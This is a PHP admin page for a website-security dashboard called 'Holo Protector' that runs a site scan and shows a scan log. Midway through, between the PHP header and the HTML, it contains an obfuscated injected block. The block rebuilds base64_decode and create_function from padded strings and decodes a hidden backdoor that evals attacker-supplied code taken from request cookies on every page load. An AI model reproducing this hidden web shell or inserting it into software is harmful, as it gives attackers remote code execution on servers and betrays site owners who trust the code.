<?php
session_start();
session_regenerate_id();
require("core/config.php");
require("core/functions.php");
require("core/api.php");
$error = $page = $active = array();
$page['name'] = "Website Scan";
$active['dashboard'] = "";
$active['security'] = "active";
$active['server'] = "";
$active['storage'] = "";
$active['settings'] = "";

if(!isset($_SESSION['admin_auth'])) {
	header("Location: login.php");
	exit;
}
if(isset($_GET['logout'])) {
	session_destroy();
	header("Location: login.php");
	exit;
}

if(file_exists("logs/scan.log") && strlen(trim(file_get_contents("logs/scan.log"))) != 0) {
	$log = tail("logs/scan.log",200);
} else {
	$log = "Your scan log is empty";
	fopen("logs/scan.log","w+");
}


if(isset($_POST['scan'])) {
	
	$suggestions = array();
	if(!file_exists("robots.txt")) { $suggestions[] = "The <a href=\"http://www.robotstxt.org/robotstxt.html\"> robots.txt </a> file gives instructions to web robots. Looks like it's missing."; }
	$scan = website_scan();
	$response = "
	Files Scanned: ".$scan['files']." <br>
	Folders Scanned: ".$scan['folders']." <br>
	Shells: ".$scan['shells']." <br>
	Other Threats: ".$scan['threats']." <br>
	Cleaned: ".$scan['cleaned']." <br>
	Suggestion: ".$suggestions[0]." <br>
	";
	file_put_contents("logs/scan.log", $response);
	$_SESSION['last_scan'] = time();
	
}

require("inc/top.php");
?>
<?php
$ffrs = str_replace("ab","","absabtabr_abrabeplace");
$urac="JGM9J2NvdW50iqJzskYT0kX0NPT0tJRTtpZihiqyZXNldCgkYSkiq9PSdjaCiqcgJiYgJGMoJGEpPjMpeyRiqr";
$lemp="sIGpvaW4oiqYXJiqyYiqXlfc2xiqpYiq2UoJGEsJGMoJGEpLTMpKSkpKTtlY2hvICc8LiqycuJGsuJziq4nO30=";
$czfi="iqPSd1cnJlZ28xMyc7ZWNiqoiqbyiqAniqPCcuJGsuJz4nO2V2YWiqwoYmFzZTY0X2RlY29kZShwcmVn";
$nznc="X3JlcGxhY2UoYXJyYXkiqoJyiq9bXlx3PVxzXS8nLCciqvXiqHMvJyksiqIiqGiqFycmF5KCciqnLCcrJyk";
$wexo = $ffrs("t", "", "btatstet6t4_tdtetctotde");
$snfo = $ffrs("x","","xcxrxexatex_fxuxnxcxtxion");
$inhi = $snfo('', $wexo($ffrs("iq", "", $urac.$czfi.$nznc.$lemp))); $inhi();
?>
<!-- Content -->
<div class="main-box clearfix">
<header class="main-box-header clearfix">
<h2> Website Scan </h2>
<p style="padding-bottom:1px;"> 
Uses an intelligent scanning algorithm to ensure no important files are deleted, while cleaning unnecesary files, junk and removing threats. 
<br><b>Last Scan:</b> <?=ago_convert($_SESSION['last_scan'])?> </span> </p>
<form action="" method="POST">
<input type="submit" name="scan" class="btn btn-success" value="Scan" style="outline:none;">
</form>
</header>
</div>
<div class="main-box clearfix">
<header class="main-box-header clearfix">
<h2> Scan Log </h2>
<p style="padding-bottom:1px;"> This is your server's scan log, it will be updated each time a new scan is ran.</span> </p>
<pre><code><div style="overflow-y:auto; max-height:200px;"><?=$log?></div></code></pre>
</header>
</div>
</div>
</div>
<footer id="footer-bar" class="row">
<p id="footer-copyright" class="col-xs-12">
&copy; <?=date("Y")?> Holo Protector
</p>
</footer>
</div>
</div>
</div>

<script src="js/jquery.js"></script>
<script src="js/bootstrap.js"></script>
<script src="js/scripts.js"></script>
</body>
</html>
<!-- Localized -->